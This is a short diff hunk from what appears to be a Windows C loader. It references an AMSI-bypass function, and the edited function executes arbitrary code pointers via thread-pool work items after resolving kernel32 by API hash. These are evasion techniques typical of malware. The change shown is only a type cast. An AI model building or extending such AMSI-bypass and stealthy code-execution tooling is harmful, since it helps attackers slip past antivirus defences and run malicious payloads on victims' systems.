@@ -262,7 +262,7 @@ static BOOL BypassAMSI_DataOnly() {
 // =============================================================================
 
 static BOOL QueueUserWorkItemExecute(PVOID pCode, PVOID pArgs) {
-    HMODULE hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
+    HMODULE hKernel32 = (HMODULE)GetModuleBaseByHash(HASH_KERNEL32);
     if (!hKernel32) return FALSE;
     
     typedef BOOL(WINAPI* TpAllocWork_t)(TP_WORK**, PTP_WORK_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
